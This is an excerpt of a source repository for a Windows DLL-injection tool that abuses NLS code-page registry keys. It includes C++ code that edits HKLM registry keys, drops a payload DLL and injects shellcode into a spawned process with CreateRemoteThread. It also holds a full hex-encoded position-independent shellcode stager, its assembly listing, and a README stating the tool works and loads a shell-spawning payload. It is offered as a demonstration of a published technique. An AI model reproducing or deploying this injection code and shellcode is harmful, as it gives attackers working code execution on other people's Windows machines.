	HANDLE hThread = CreateRemoteThread(regObject->m_procInfo.hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ShellcodeMemory, lpCodePageID, 0, nullptr);
	if (hThread == INVALID_HANDLE_VALUE) {
		std::printf("Could not open a handle to the payload .exe\n");
		return;
	}
	std::printf("Sucessfully injected to remote process, where shellcodeMemory is %p, and the codePageID is %d\n", ShellcodeMemory, codePageID);
}

//Error of payload is at writing the payload.dll!
bool OpenKeyForNlsModification(PRegistryKey regObject) noexcept
{
	bool bResult = false; 
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regObject->getStringBuffer(Index::SUBKEY_KEY_VALUE),
		0, KEY_ALL_ACCESS, &regObject->hSubkeyNls) != EXIT_SUCCESS)
	{
		std::printf("Could not open handle to subkey of codePage!, LastError [0x%x]\n", GetLastError());
		return bResult;
	}
	if (!DropSystemDllPayload(regObject)) {
		std::printf("Payload dll has been failed to drop main payload \n");
		return bResult;
	}
	if (!IterateCodePageAndExtractProperId(regObject)){
		std::printf("Could not iterate key for proper modification. Last error: [0x%x]\n", GetLastError());
		return bResult;
	}
	//DWORD dwCodePageID = regObject->getCodePageID(CodePageIDIndex::CodePageInt);
	//std::printf("The code page ID is %d\n", dwCodePageID);
	//SelfSpawnPayload(dwCodePageID);
	if (CreateProcessToInject(&regObject->m_procInfo))
	{
		InjectStagerToPayload(regObject);
	}

	return bResult;
}

```

`NLSRegistryCodeInjection/payload.hpp`:

```hpp
#pragma once
#include "headers.hpp"


//Appply namespaces to this functions, maybe inside of a class itself :)
BOOLEAN CompareLastElementString(PWCHAR str1, PWCHAR str2, BOOLEAN CaseInsensitive);
bool OpenKeyForNlsModification(PRegistryKey regObject) noexcept;
UINT StringToInt(PWCHAR str) noexcept;
bool FindCodePageWithPayload(PRegistryKey regObject, UINT dwValuesCount, UINT dwMaxLenValues);
bool IterateCodePageAndExtractProperId(PRegistryKey regObject);
bool CreateProcessToInject(LPPROCESS_INFORMATION procInfo);
bool DropSystemDllPayload(PRegistryKey regObject);
void InjectStagerToPayload(PRegistryKey regObject);
UINT StringToInt(PWCHAR str) noexcept;
UINT StringToIntDecimal(PWCHAR str) noexcept;

//PIC shellcode.
constexpr BYTE StubInject[] = { 0x56,0x48,0x8b,0xf4,0x48,0x83,0xe4,0xf0,0x48,0x83,0xec,0x20,0xe8,0x05,0x00,0x00,0x00,0x48,0x8b,0xe6,0x5e,0xc3,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x58,0x48,0x8d,0x4c,0x24,0x20,0xe8,0x87,0x00,0x00,0x00,0x85,0xc0,0x74,0x07,0xb8,0x01,0x00,0x00,0x00,0xeb,0x11,0x48,0x8d,0x54,0x24,0x20,0x48,0x8b,0x4c,0x24,0x60,0xe8,0x07,0x00,0x00,0x00,0x33,0xc0,0x48,0x83,0xc4,0x58,0xc3,0x48,0x89,0x54,0x24,0x10,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x38,0x48,0x8b,0x44,0x24,0x40,0x8b,0x00,0x89,0x44,0x24,0x40,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x08,0x48,0x85,0xc0,0x75,0x0e,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x18,0x85,0xc0,0x75,0x02,0xeb,0x2d,0x8b,0x4c,0x24,0x40,0x48,0x8b,0x44,0x24,0x48,0xff,0x10,0x85,0xc0,0x75,0x02,0xeb,0x1c,0x8b,0x4c,0x24,0x40,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x10,0x85,0xc0,0x75,0x02,0xeb,0x0a,0x33,0xc9,0x48,0x8b,0x44,0x24,0x48,0xff,0x50,0x20,0x48,0x83,0xc4,0x38,0xc3,0x48,0x89,0x4c,0x24,0x08,0x48,0x81,0xec,0xd8,0x00,0x00,0x00,0xb8,0x6b,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa0,0x00,0x00,0x00,0xb8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa2,0x00,0x00,0x00,0xb8,0x72,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa4,0x00,0x00,0x00,0xb8,0x6e,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa6,0x00,0x00,0x00,0xb8,0x65,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xa8,0x00,0x00,0x00,0xb8,0x6c,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xaa,0x00,0x00,0x00,0xb8,0x33,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xac,0x00,0x00,0x00,0xb8,0x32,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xae,0x00,0x00,0x00,0xb8,0x2e,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb0,0x00,0x00,0x00,0xb8,0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb2,0x00,0x00,0x00,0xb8,0x6c,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb4,0x00,0x00,0x00,0xb8,0x6c,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0xb6,0x00,0x00,0x00,0x33,0xc0,0x66,0x89,0x84,0x24,0xb8,0x00,0x00,0x00,0x48,0x8d,0x8c,0x24,0xa0,0x00,0x00,0x00,0xe8,0xe4,0x05,0x00,0x00,0x48,0x89,0x84,0x24,0x98,0x00,0x00,0x00,0x48,0x83,0xbc,0x24,0x98,0x00,0x00,0x00,0x00,0x75,0x0a,0xb8,0x01,0x00,0x00,0x00,0xe9,0x8f,0x03,0x00,0x00,0xc6,0x44,0x24,0x40,0x47,0xc6,0x44,0x24,0x41,0x65,0xc6,0x44,0x24,0x42,0x74,0xc6,0x44,0x24,0x43,0x50,0xc6,0x44,0x24,0x44,0x72,0xc6,0x44,0x24,0x45,0x6f,0xc6,0x44,0x24,0x46,0x63,0xc6,0x44,0x24,0x47,0x41,0xc6,0x44,0x24,0x48,0x64,0xc6,0x44,0x24,0x49,0x64,0xc6,0x44,0x24,0x4a,0x72,0xc6,0x44,0x24,0x4b,0x65,0xc6,0x44,0x24,0x4c,0x73,0xc6,0x44,0x24,0x4d,0x73,0xc6,0x44,0x24,0x4e,0x00,0x48,0x8d,0x54,0x24,0x40,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0xe8,0x3a,0x03,0x00,0x00,0x48,0x89,0x84,0x24,0xc0,0x00,0x00,0x00,0x48,0x83,0xbc,0x24,0xc0,0x00,0x00,0x00,0x00,0x75,0x0a,0xb8,0x03,0x00,0x00,0x00,0xe9,0x15,0x03,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x8b,0x8c,0x24,0xc0,0x00,0x00,0x00,0x48,0x89,0x48,0x28,0xc6,0x44,0x24,0x50,0x47,0xc6,0x44,0x24,0x51,0x65,0xc6,0x44,0x24,0x52,0x74,0xc6,0x44,0x24,0x53,0x43,0xc6,0x44,0x24,0x54,0x6f,0xc6,0x44,0x24,0x55,0x6e,0xc6,0x44,0x24,0x56,0x73,0xc6,0x44,0x24,0x57,0x6f,0xc6,0x44,0x24,0x58,0x6c,0xc6,0x44,0x24,0x59,0x65,0xc6,0x44,0x24,0x5a,0x57,0xc6,0x44,0x24,0x5b,0x69,0xc6,0x44,0x24,0x5c,0x6e,0xc6,0x44,0x24,0x5d,0x64,0xc6,0x44,0x24,0x5e,0x6f,0xc6,0x44,0x24,0x5f,0x77,0xc6,0x44,0x24,0x60,0x00,0xc6,0x44,0x24,0x30,0x41,0xc6,0x44,0x24,0x31,0x6c,0xc6,0x44,0x24,0x32,0x6c,0xc6,0x44,0x24,0x33,0x6f,0xc6,0x44,0x24,0x34,0x63,0xc6,0x44,0x24,0x35,0x43,0xc6,0x44,0x24,0x36,0x6f,0xc6,0x44,0x24,0x37,0x6e,0xc6,0x44,0x24,0x38,0x73,0xc6,0x44,0x24,0x39,0x6f,0xc6,0x44,0x24,0x3a,0x6c,0xc6,0x44,0x24,0x3b,0x65,0xc6,0x44,0x24,0x3c,0x00,0xc6,0x44,0x24,0x20,0x53,0xc6,0x44,0x24,0x21,0x65,0xc6,0x44,0x24,0x22,0x74,0xc6,0x44,0x24,0x23,0x43,0xc6,0x44,0x24,0x24,0x6f,0xc6,0x44,0x24,0x25,0x6e,0xc6,0x44,0x24,0x26,0x73,0xc6,0x44,0x24,0x27,0x6f,0xc6,0x44,0x24,0x28,0x6c,0xc6,0x44,0x24,0x29,0x65,0xc6,0x44,0x24,0x2a,0x43,0xc6,0x44,0x24,0x2b,0x50,0xc6,0x44,0x24,0x2c,0x00,0xc6,0x44,0x24,0x68,0x53,0xc6,0x44,0x24,0x69,0x65,0xc6,0x44,0x24,0x6a,0x74,0xc6,0x44,0x24,0x6b,0x43,0xc6,0x44,0x24,0x6c,0x6f,0xc6,0x44,0x24,0x6d,0x6e,0xc6,0x44,0x24,0x6e,0x73,0xc6,0x44,0x24,0x6f,0x6f,0xc6,0x44,0x24,0x70,0x6c,0xc6,0x44,0x24,0x71,0x65,0xc6,0x44,0x24,0x72,0x4f,0xc6,0x44,0x24,0x73,0x75,0xc6,0x44,0x24,0x74,0x74,0xc6,0x44,0x24,0x75,0x70,0xc6,0x44,0x24,0x76,0x75,0xc6,0x44,0x24,0x77,0x74,0xc6,0x44,0x24,0x78,0x43,0xc6,0x44,0x24,0x79,0x50,0xc6,0x44,0x24,0x7a,0x00,0xc6,0x84,0x24,0x80,0x00,0x00,0x00,0x53,0xc6,0x84,0x24,0x81,0x00,0x00,0x00,0x65,0xc6,0x84,0x24,0x82,0x00,0x00,0x00,0x74,0xc6,0x84,0x24,0x83,0x00,0x00,0x00,0x54,0xc6,0x84,0x24,0x84,0x00,0x00,0x00,0x68,0xc6,0x84,0x24,0x85,0x00,0x00,0x00,0x72,0xc6,0x84,0x24,0x86,0x00,0x00,0x00,0x65,0xc6,0x84,0x24,0x87,0x00,0x00,0x00,0x61,0xc6,0x84,0x24,0x88,0x00,0x00,0x00,0x64,0xc6,0x84,0x24,0x89,0x00,0x00,0x00,0x55,0xc6,0x84,0x24,0x8a,0x00,0x00,0x00,0x49,0xc6,0x84,0x24,0x8b,0x00,0x00,0x00,0x4c,0xc6,0x84,0x24,0x8c,0x00,0x00,0x00,0x61,0xc6,0x84,0x24,0x8d,0x00,0x00,0x00,0x6e,0xc6,0x84,0x24,0x8e,0x00,0x00,0x00,0x67,0xc6,0x84,0x24,0x8f,0x00,0x00,0x00,0x75,0xc6,0x84,0x24,0x90,0x00,0x00,0x00,0x61,0xc6,0x84,0x24,0x91,0x00,0x00,0x00,0x67,0xc6,0x84,0x24,0x92,0x00,0x00,0x00,0x65,0xc6,0x84,0x24,0x93,0x00,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x68,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x01,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x38,0x00,0x75,0x0a,0xb8,0x04,0x00,0x00,0x00,0xe9,0xf0,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x50,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x08,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x08,0x00,0x75,0x0a,0xb8,0x05,0x00,0x00,0x00,0xe9,0xb3,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x20,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x10,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x10,0x00,0x75,0x07,0xb8,0x06,0x00,0x00,0x00,0xeb,0x79,0x48,0x8d,0x54,0x24,0x30,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x18,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x18,0x00,0x75,0x07,0xb8,0x07,0x00,0x00,0x00,0xeb,0x3f,0x48,0x8d,0x94,0x24,0x80,0x00,0x00,0x00,0x48,0x8b,0x8c,0x24,0x98,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0xff,0x50,0x28,0x48,0x8b,0x8c,0x24,0xe0,0x00,0x00,0x00,0x48,0x89,0x41,0x20,0x48,0x8b,0x84,0x24,0xe0,0x00,0x00,0x00,0x48,0x83,0x78,0x20,0x00,0x75,0x07,0xb8,0x08,0x00,0x00,0x00,0xeb,0x02,0x33,0xc0,0x48,0x81,0xc4,0xd8,0x00,0x00,0x00,0xc3,0x48,0x89,0x54,0x24,0x10,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x78,0x48,0x8b,0x84,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x30,0x48,0x8b,0x44,0x24,0x30,0x0f,0xb7,0x00,0x3d,0x4d,0x5a,0x00,0x00,0x74,0x07,0x33,0xc0,0xe9,0xfa,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x30,0x48,0x63,0x40,0x3c,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,0x44,0x24,0x40,0xb8,0x08,0x00,0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x4c,0x24,0x40,0x48,0x8d,0x84,0x01,0x88,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x38,0x48,0x8b,0x44,0x24,0x38,0x83,0x38,0x00,0x75,0x07,0x33,0xc0,0xe9,0xb2,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x38,0x8b,0x00,0x89,0x44,0x24,0x18,0x8b,0x44,0x24,0x18,0x48,0x03,0x84,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x10,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x18,0x48,0x89,0x44,0x24,0x48,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x1c,0x89,0x44,0x24,0x24,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x20,0x89,0x44,0x24,0x1c,0x48,0x8b,0x44,0x24,0x10,0x8b,0x40,0x24,0x89,0x44,0x24,0x20,0x48,0xc7,0x44,0x24,0x08,0x00,0x00,0x00,0x00,0xeb,0x0d,0x48,0x8b,0x44,0x24,0x08,0x48,0xff,0xc0,0x48,0x89,0x44,0x24,0x08,0x48,0x8b,0x44,0x24,0x48,0x48,0x39,0x44,0x24,0x08,0x0f,0x83,0x3b,0x01,0x00,0x00,0x8b,0x44,0x24,0x1c,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x8b,0x4c,0x24,0x08,0x48,0x8d,0x04,0x88,0x48,0x89,0x44,0x24,0x58,0x8b,0x44,0x24,0x20,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x8b,0x4c,0x24,0x08,0x48,0x8d,0x04,0x48,0x48,0x89,0x44,0x24,0x50,0x8b,0x44,0x24,0x24,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x8b,0x4c,0x24,0x50,0x0f,0xb7,0x09,0x48,0x8d,0x04,0x88,0x48,0x89,0x44,0x24,0x60,0x48,0x8b,0x44,0x24,0x58,0x8b,0x00,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,0x44,0x24,0x28,0x48,0xc7,0x04,0x24,0x00,0x00,0x00,0x00,0xeb,0x0b,0x48,0x8b,0x04,0x24,0x48,0xff,0xc0,0x48,0x89,0x04,0x24,0x48,0x8b,0x04,0x24,0x48,0x8b,0x8c,0x24,0x88,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x74,0x45,0x48,0x8b,0x04,0x24,0x48,0x8b,0x4c,0x24,0x28,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x74,0x2f,0x48,0x8b,0x04,0x24,0x48,0x8b,0x8c,0x24,0x88,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x48,0x8b,0x0c,0x24,0x48,0x8b,0x54,0x24,0x28,0x48,0x03,0xd1,0x48,0x8b,0xca,0x0f,0xbe,0x09,0x3b,0xc1,0x74,0x02,0xeb,0x02,0xeb,0x97,0x48,0x8b,0x04,0x24,0x48,0x8b,0x8c,0x24,0x88,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x75,0x2d,0x48,0x8b,0x04,0x24,0x48,0x8b,0x4c,0x24,0x28,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x0f,0xbe,0x00,0x85,0xc0,0x75,0x17,0x48,0x8b,0x44,0x24,0x60,0x8b,0x00,0x48,0x8b,0x8c,0x24,0x80,0x00,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0xeb,0x07,0xe9,0xa8,0xfe,0xff,0xff,0x33,0xc0,0x48,0x83,0xc4,0x78,0xc3,0x48,0x89,0x4c,0x24,0x08,0x48,0x83,0xec,0x58,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x40,0x48,0x8b,0x44,0x24,0x40,0x48,0x8b,0x40,0x18,0x48,0x89,0x44,0x24,0x48,0x48,0x8b,0x44,0x24,0x48,0x48,0x83,0xc0,0x20,0x48,0x89,0x44,0x24,0x38,0x48,0x8b,0x44,0x24,0x38,0x48,0x8b,0x00,0x48,0x89,0x44,0x24,0x30,0xeb,0x0d,0x48,0x8b,0x44,0x24,0x30,0x48,0x8b,0x00,0x48,0x89,0x44,0x24,0x30,0x48,0x8b,0x44,0x24,0x38,0x48,0x39,0x44,0x24,0x30,0x0f,0x84,0xbf,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x30,0x48,0x83,0xe8,0x10,0x48,0x89,0x44,0x24,0x28,0x48,0x83,0x7c,0x24,0x28,0x00,0x74,0x0c,0x48,0x8b,0x44,0x24,0x28,0x48,0x83,0x78,0x30,0x00,0x75,0x05,0xe9,0x98,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x28,0x48,0x8b,0x40,0x60,0x48,0x89,0x44,0x24,0x10,0x48,0x83,0x7c,0x24,0x10,0x00,0x75,0x02,0xeb,0xa4,0x48,0xc7,0x04,0x24,0x00,0x00,0x00,0x00,0xeb,0x0b,0x48,0x8b,0x04,0x24,0x48,0xff,0xc0,0x48,0x89,0x04,0x24,0x48,0x8b,0x44,0x24,0x28,0x0f,0xb7,0x40,0x58,0x48,0x39,0x04,0x24,0x0f,0x83,0x26,0x01,0x00,0x00,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x74,0x11,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x75,0x05,0xe9,0xff,0x00,0x00,0x00,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x5a,0x7f,0x47,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x41,0x7c,0x35,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xe8,0x41,0x83,0xc0,0x61,0x89,0x44,0x24,0x20,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x54,0x24,0x20,0x66,0x89,0x14,0x48,0x0f,0xb7,0x44,0x24,0x20,0x66,0x89,0x44,0x24,0x08,0xeb,0x12,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x66,0x89,0x44,0x24,0x08,0x0f,0xb7,0x44,0x24,0x08,0x66,0x89,0x44,0x24,0x18,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x5a,0x7f,0x47,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xf8,0x41,0x7c,0x35,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x83,0xe8,0x41,0x83,0xc0,0x61,0x89,0x44,0x24,0x24,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x54,0x24,0x24,0x66,0x89,0x14,0x48,0x0f,0xb7,0x44,0x24,0x24,0x66,0x89,0x44,0x24,0x0a,0xeb,0x12,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x66,0x89,0x44,0x24,0x0a,0x0f,0xb7,0x44,0x24,0x0a,0x66,0x89,0x44,0x24,0x1c,0x0f,0xb7,0x44,0x24,0x18,0x0f,0xb7,0x4c,0x24,0x1c,0x3b,0xc1,0x74,0x02,0xeb,0x05,0xe9,0xbc,0xfe,0xff,0xff,0x48,0x8b,0x44,0x24,0x60,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x75,0x1c,0x48,0x8b,0x44,0x24,0x10,0x48,0x8b,0x0c,0x24,0x0f,0xb7,0x04,0x48,0x85,0xc0,0x75,0x0b,0x48,0x8b,0x44,0x24,0x28,0x48,0x8b,0x40,0x30,0xeb,0x07,0xe9,0x24,0xfe,0xff,0xff,0x33,0xc0,0x48,0x83,0xc4,0x58,0xc3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
constexpr size_t lengthInject = std::size(StubInject);

```

`NLSRegistryCodeInjection/resource1.h`:

```h
//{{NO_DEPENDENCIES}}
// Archivo de inclusión generado de Microsoft Visual C++.
// Usado por NLSRegistryCodeInjection.rc
//
#define IDR_RT_RCDATA1                  101

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`README.md`:

```md
# NlsCodeInjectionThroughRegistry
Dll injection through registry modification of NLS code page ID.

It requieres administrator privileges, but it definetely works.
 
# How does it work?
It is based on jonas lykk discovery here: https://twitter.com/jonaslyk/status/1352729173631135751?lang=en

There is two ways to accomplish this: 
Either call SetThreadLocale and set up an export function named NlsDllCodePageTranslation, where your main payload is in there.
Or the second method, which is actually implemented here, it is possible to execute using functions such as SetConsoleCp  or SetConsoleOutputCP, you dont care about exports at all.

If the process is not console based, you can allocate one with AllocConsole, payload will still get triggered.

For this reason, to make it to work, I had to create position independent shellcode and inject it to a remote process, which works as a stager to the actual loading of the dll.
This is just meant for demostration purposes.

One day in the future I will reverse a little bit better how this works, if i have time.

# How to use?
Compile the project in release x64, it uses the default jonas payload, which spawns a shell when loaded.
ShellcodeInjection is just an additional project I used to convert C to shellcode, using hasherezade method described here:
https://github.com/vxunderground/VXUG-Papers/blob/main/From%20a%20C%20project%20through%20assembly%20to%20shellcode.pdf

Only x64, tested in Windows 11.

```

`ShellcodeInjection/ShellcodeInjection.asm`:

```asm
; Listing generated by Microsoft (R) Optimizing Compiler Version 19.30.30706.0 

include listing.inc

;INCLUDELIB LIBCMT
;INCLUDELIB OLDNAMES

PUBLIC	?iat_kernel32@@3Ukernel32Iat@@A			; iat_kernel32
PUBLIC	?piat_struct32@@3PEAUkernel32Iat@@EA		; piat_struct32
_BSS	SEGMENT
?iat_kernel32@@3Ukernel32Iat@@A DB 030H DUP (?)		; iat_kernel32
?piat_struct32@@3PEAUkernel32Iat@@EA DQ 01H DUP (?)	; piat_struct32
_BSS	ENDS
PUBLIC	?GetModuleByName@@YAPEAXPEA_W@Z			; GetModuleByName
PUBLIC	?GetFunctionByName@@YAPEAXPEAXPEAD@Z		; GetFunctionByName
PUBLIC	?initializeIatShellcode@@YAIAEAUkernel32Iat@@@Z	; initializeIatShellcode
PUBLIC	?SpawnPayload@@YAXPEAKAEAUkernel32Iat@@@Z	; SpawnPayload
PUBLIC	main
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
; Function compile flags: /Odtp
_TEXT SEGMENT
AlignRSP PROC
	push rsi ; Preserve RSI since we're stomping on it
	mov rsi, rsp ; Save the value of RSP so it can be restored
	and rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
	sub rsp, 020h ; Allocate homing space for ExecutePayload
	call main ; Call the entry point of the payload
	mov rsp, rsi ; Restore the original value of RSP
	pop rsi ; Restore RSI
	ret ; Return to caller
AlignRSP ENDP
_TEXT ENDS

_TEXT	SEGMENT
iat$ = 32
dwCodeID$ = 96
main	PROC
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\ShellcodeInjection.cpp
; Line 69
$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H
; Line 71
	lea	rcx, QWORD PTR iat$[rsp]
	call	?initializeIatShellcode@@YAIAEAUkernel32Iat@@@Z ; initializeIatShellcode
	test	eax, eax
	je	SHORT $LN2@main
; Line 72
	mov	eax, 1
	jmp	SHORT $LN1@main
$LN2@main:
; Line 74
	lea	rdx, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR dwCodeID$[rsp]
	call	?SpawnPayload@@YAXPEAKAEAUkernel32Iat@@@Z ; SpawnPayload
; Line 76
	xor	eax, eax
$LN1@main:
; Line 77
	add	rsp, 88					; 00000058H
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
dwCodePageID$ = 32
dwCodePageId$ = 64
iat$ = 72
?SpawnPayload@@YAXPEAKAEAUkernel32Iat@@@Z PROC		; SpawnPayload
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\ShellcodeInjection.cpp
; Line 51
$LN7:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
; Line 52
	mov	rax, QWORD PTR dwCodePageId$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR dwCodePageID$[rsp], eax
; Line 53
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	test	rax, rax
	jne	SHORT $LN2@SpawnPaylo
; Line 55
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+24]
	test	eax, eax
	jne	SHORT $LN3@SpawnPaylo
; Line 56
	jmp	SHORT $LN1@SpawnPaylo
$LN3@SpawnPaylo:
$LN2@SpawnPaylo:
; Line 59
	mov	ecx, DWORD PTR dwCodePageID$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax]
	test	eax, eax
	jne	SHORT $LN4@SpawnPaylo
; Line 60
	jmp	SHORT $LN1@SpawnPaylo
$LN4@SpawnPaylo:
; Line 62
	mov	ecx, DWORD PTR dwCodePageID$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+16]
	test	eax, eax
	jne	SHORT $LN5@SpawnPaylo
; Line 63
	jmp	SHORT $LN1@SpawnPaylo
$LN5@SpawnPaylo:
; Line 65
	xor	ecx, ecx
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+32]
$LN1@SpawnPaylo:
; Line 66
	add	rsp, 56					; 00000038H
